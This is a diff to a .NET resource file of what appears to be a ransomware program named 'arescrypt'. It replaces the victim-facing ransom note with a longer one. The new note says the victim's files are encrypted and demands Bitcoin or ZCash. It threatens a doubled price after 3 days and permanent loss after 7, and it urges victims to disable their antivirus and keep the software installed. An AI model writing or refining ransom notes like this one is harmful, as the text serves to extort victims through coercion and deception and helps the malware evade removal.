@@ -118,19 +118,40 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <data name="displayMessage.Text" xml:space="preserve">
-    <value>Hello. Your files have been encrypted. 
-You must pay the amount defined below, and then send an
-email carrying a screenshot (for proof), your Unique User ID,
-and the wallet address used to pay the ransom. 
+    <value>What Happened to My Computer?
+Your important files are encrypted.
+Many of your documents, photos, videos, databases, and other files are no longer
+accessible because they have been encrypted. Maybe you are busy looking for a way to
+recover your files, but do not waste your time. Nobody can recover your files without
+our decryption service. 
 
-Once all this has been finished, we will proceed to verify that
-all submitted information is accurate, then we may return your
-email to inform you of your current account's status. 
+Can I Recover My Files?
+Sure. We guarantee that you can recover all your files safely and easily. But you have
+not so enough time. 
+You can decrypt some of your files for free. Try now by clicking &lt;Decrypt&gt;.
+But if you want to decrypt all your files, you need to pay.
+You only have 3 days to submit the payment. After that the price will be doubled.
+Also, if you don't pay in 7 days, you won't be able to recover your files forever. 
 
-Happy hacking!</value>
+How Do I Pay?
+Payment is accepted in Bitcoin and ZCash only. For more information, click &lt;About bitcoin&gt;.
+Please check the current price of Bitcoin and buy some bitcoins. For more information,
+click &lt;How to buy bitcoins&gt;.
+And send the correct amount to the address specified in this window. 
+After your payent, click &lt;Check Payment&gt;. Best time to check: 9:00am - 11:00am
+GMT from Monday to Friday. 
+Once the payment is checked, you can start decrypting your files immediately. 
+
+Contact
+If you need our assistance, send a message by clicking &lt;Contact Us&gt;.
+
+We strongly recommend you to not remove this software, and disable your anti-virus
+for a while, until you pay and the payment gets processed. If your anti-virus gets
+updated and removes this software automatically, it will not be able to recover your
+files even if you pay!</value>
   </data>
   <assembly alias="System.Drawing" name="System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
-  <data name="pictureBox1.BackgroundImage" type="System.Drawing.Bitmap, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+  <data name="arescryptLogo.BackgroundImage" type="System.Drawing.Bitmap, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
     <value>
         /9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcI
         CQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwM
